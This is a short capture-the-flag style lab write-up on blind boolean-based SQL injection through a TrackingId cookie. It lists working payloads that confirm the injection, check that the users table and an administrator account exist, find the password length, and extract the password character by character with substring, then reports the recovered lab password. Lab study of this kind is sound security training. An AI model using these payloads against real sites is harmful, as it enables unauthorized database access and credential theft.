

## Lab analysis 
- result of sql query is not returned
- also no error message is displayed
- But "welcome back" message is displayed if the query return any row

## Aim : Find administrator password form users table having columns username and password


## Burp:
Cookie: TrackingId=tJ1ux5PVRUX2vGYM;

## checking if vulnrable to sqli or not

`Cookie: TrackingId=tJ1ux5PVRUX2vGYM ' and 1=1 --; ` -> return Welcome back message
`Cookie: TrackingId=tJ1ux5PVRUX2vGYM ' and 1=2 --; ` -> doesnot return Welcome back message

## checking user table exist or not.

`Cookie: TrackingId=tJ1ux5PVRUX2vGYM ' and (select 'x' from users ) = 'x' -- ` 
return welcome back message -> users table exist

## checking if administrator username exist in users table

`Cookie: TrackingId=tJ1ux5PVRUX2vGYM ' and (select username from users where username = 'administrator') = 'administrator' -- `

return welcome back message -> users table exist


## Finding the length of password

`Cookie: TrackingId=tJ1ux5PVRUX2vGYM ' and (select length(password) from users where username = 'administrator')>0 -- `

continuing the loop
we got the length to be 20



## Finding the password

`Cookie: TrackingId=tJ1ux5PVRUX2vGYM ' and (select substring(password ,1,1) from users where username = 'administrator')= 'a' -- `

we found the password to be:
baw6dlog9hpv7tfxus9l





























